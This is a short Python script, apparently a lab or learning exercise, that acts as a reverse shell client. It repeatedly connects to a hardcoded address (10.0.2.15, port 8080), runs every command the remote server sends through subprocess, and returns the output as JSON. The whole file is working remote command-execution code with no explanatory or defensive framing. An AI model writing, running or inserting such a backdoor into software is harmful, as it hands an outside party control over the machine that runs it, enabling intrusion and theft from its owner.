import socket
import subprocess
import json

SERVER_IP = '10.0.2.15'
SERVER_PORT = 8080

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    while True:
        try:
            client_socket.connect((SERVER_IP, SERVER_PORT))
            break
        except ConnectionRefusedError:
            pass

    while True:
        data = client_socket.recv(1024).decode()
        print("Received ", data)

        if not data:
            break

        p = subprocess.Popen(data.split(' '), stdout=subprocess.PIPE)
        output = []

        for i in p.stdout.readlines():
            output.append(i.decode().strip())

        if output == []:
            output = "Done"

        client_socket.sendall(json.dumps(output).encode())

print("Connection closed")
